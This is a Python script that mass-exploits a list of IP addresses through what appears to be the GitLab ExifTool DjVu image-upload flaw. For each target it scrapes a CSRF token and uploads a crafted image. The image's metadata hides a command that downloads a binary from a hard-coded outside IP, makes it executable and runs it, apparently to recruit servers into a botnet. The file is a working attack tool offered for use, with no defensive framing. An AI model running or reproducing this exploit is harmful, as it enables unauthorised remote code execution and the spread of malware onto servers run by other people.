import sys
import os
import requests
from bs4 import BeautifulSoup
import base64
import random
import argparse
from queue import *
from threading import Thread
import time

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
requests.packages.urllib3.disable_warnings()
command = "wget http://74.201.28.102/idk/home.x86; chmod 777 *; ./home.x86 x86"

def attack(target):
    session = requests.Session()
    try:
        print("[$] Checking {}".format(target))
        req = session.get(target.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(req.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")

        # Payload
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{"+  command +"} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}

        resp = session.post(target.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)

        if "Failed to process image" in resp.text:
            print("[+] Target {} vulnerable".format(target))
            print("[#] Exploit success!")
        else:
            print("[X] Failed, target {} may be not vulnerable".format(target))
    except Exception as e:
        print(e)

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            input2 = "http://"
            input3 = "/users/sign_up"            
            input4 = input2 + input + input3
            thread = Thread(target=attack, args=(input4,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return

if __name__ == '__main__': 
    main()
